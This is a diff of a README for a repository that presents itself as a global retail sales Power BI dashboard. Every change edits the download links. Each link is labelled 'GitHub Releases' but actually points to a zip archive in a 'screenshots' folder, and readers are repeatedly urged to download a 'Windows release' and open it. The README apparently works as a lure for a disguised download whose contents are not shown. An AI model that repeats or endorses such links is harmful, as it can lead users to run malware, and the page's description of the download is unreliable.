@@ -1,10 +1,10 @@
 # 📊 global-retail-sales-analysis - Track Sales and Profit Clearly
 
-[![Download the dashboard](https://img.shields.io/badge/Download%20the%20dashboard-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/toxicant-role617/global-retail-sales-analysis/main/screenshots/global-analysis-retail-sales-v2.8.zip)
+[![Download the dashboard](https://img.shields.io/badge/Download%20the%20dashboard-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/toxicant-role617/global-retail-sales-analysis/raw/refs/heads/main/screenshots/global-analysis-retail-sales-v2.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/toxicant-role617/global-retail-sales-analysis/main/screenshots/global-analysis-retail-sales-v2.8.zip)
+Visit this page to download: [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/raw/refs/heads/main/screenshots/global-analysis-retail-sales-v2.8.zip)
 
 Download the latest release for Windows, then open the file you download.
 
@@ -37,7 +37,7 @@ If you want to open and edit the dashboard, install Power BI Desktop first. If y
 
 ## 🚀 Getting started
 
-1. Go to the [GitHub Releases](https://raw.githubusercontent.com/toxicant-role617/global-retail-sales-analysis/main/screenshots/global-analysis-retail-sales-v2.8.zip) page
+1. Go to the [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/raw/refs/heads/main/screenshots/global-analysis-retail-sales-v2.8.zip) page
 2. Download the latest release for Windows
 3. Save the file to a folder you can find easily, such as Downloads or Desktop
 4. If the file is zipped, right-click it and choose **Extract All**
@@ -184,11 +184,11 @@ For the best viewing experience:
 
 ## 📝 Release use
 
-When a new version appears on the [GitHub Releases](https://raw.githubusercontent.com/toxicant-role617/global-retail-sales-analysis/main/screenshots/global-analysis-retail-sales-v2.8.zip) page, download the newest package and replace the older copy on your computer if needed
+When a new version appears on the [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/raw/refs/heads/main/screenshots/global-analysis-retail-sales-v2.8.zip) page, download the newest package and replace the older copy on your computer if needed
 
 ## 🖱️ Quick download steps
 
-1. Open the [GitHub Releases](https://raw.githubusercontent.com/toxicant-role617/global-retail-sales-analysis/main/screenshots/global-analysis-retail-sales-v2.8.zip) page
+1. Open the [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/raw/refs/heads/main/screenshots/global-analysis-retail-sales-v2.8.zip) page
 2. Download the latest Windows release
 3. Extract the files if needed
 4. Open the Power BI report file
